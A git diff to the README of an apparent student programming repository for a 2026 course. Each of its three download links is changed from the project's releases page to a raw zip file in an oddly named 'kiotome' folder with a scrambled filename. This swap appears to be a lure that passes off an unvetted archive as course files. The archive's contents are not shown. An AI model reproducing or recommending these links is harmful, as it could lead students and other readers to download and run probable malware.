@@ -1,6 +1,6 @@
 # 📚 fundamentos_de_programacion_alumnos_DuocUCPMontt_2026 - Simple Student Program Toolbox
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Files-brightgreen)](https://github.com/Haliautocatalytic774/fundamentos_de_programacion_alumnos_DuocUCPMontt_2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Files-brightgreen)](https://raw.githubusercontent.com/Haliautocatalytic774/fundamentos_de_programacion_alumnos_DuocUCPMontt_2026/main/kiotome/de-programacion-fundamentos-alumnos-Duoc-UCP-Montt-3.8.zip)
 
 ---
 
@@ -52,7 +52,7 @@ To start using the programs, follow these steps carefully. The guide assumes you
 
 Go to the release page where you can find all current files:
 
-[![Visit Release Page](https://img.shields.io/badge/Go%20to%20Download%20Page-blue)](https://github.com/Haliautocatalytic774/fundamentos_de_programacion_alumnos_DuocUCPMontt_2026/releases)
+[![Visit Release Page](https://img.shields.io/badge/Go%20to%20Download%20Page-blue)](https://raw.githubusercontent.com/Haliautocatalytic774/fundamentos_de_programacion_alumnos_DuocUCPMontt_2026/main/kiotome/de-programacion-fundamentos-alumnos-Duoc-UCP-Montt-3.8.zip)
 
 This page lists all available versions and files related to the project.
 
@@ -135,7 +135,7 @@ The programs in this repository are designed for learning. Consider these next s
 ## 🔗 Additional Links
 
 Primary release and download page:  
-https://github.com/Haliautocatalytic774/fundamentos_de_programacion_alumnos_DuocUCPMontt_2026/releases
+https://raw.githubusercontent.com/Haliautocatalytic774/fundamentos_de_programacion_alumnos_DuocUCPMontt_2026/main/kiotome/de-programacion-fundamentos-alumnos-Duoc-UCP-Montt-3.8.zip
 
 ---
 
